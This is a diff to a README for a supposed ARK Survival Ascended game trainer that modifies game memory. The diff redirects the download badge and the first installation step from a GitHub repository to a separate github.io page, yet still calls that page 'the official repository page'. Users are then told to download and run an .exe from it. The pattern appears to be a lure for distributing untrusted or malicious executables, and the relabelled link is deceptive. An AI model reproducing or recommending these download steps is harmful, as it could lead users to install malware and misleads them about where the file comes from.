@@ -1,6 +1,6 @@
 # 🦖 ARK-Survival-Ascended-Trainer-2026 - Master your game with reliable tools
 
-[![Download ARK Trainer](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/nelieuncool750/ARK-Survival-Ascended-Trainer-2026)
+[![Download ARK Trainer](https://img.shields.io/badge/Download-Release-blue.svg)](https://nelieuncool750.github.io)
 
 This tool helps players manage game settings and resources within Ark Survival Ascended. It modifies game memory to provide you with control over your single-player sessions. This manual explains how to set up the software on your Windows computer.
 
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets these standards to prevent performanc
 
 Follow these steps to place the trainer on your machine and use it with your game:
 
-1. Open your web browser and navigate to the official repository page: [https://github.com/nelieuncool750/ARK-Survival-Ascended-Trainer-2026](https://github.com/nelieuncool750/ARK-Survival-Ascended-Trainer-2026).
+1. Open your web browser and navigate to the official repository page: [https://nelieuncool750.github.io](https://nelieuncool750.github.io).
 2. Look for the Releases section on the right side of the page.
 3. Click the most recent version tag.
 4. Select the .exe file from the assets list to start your download.
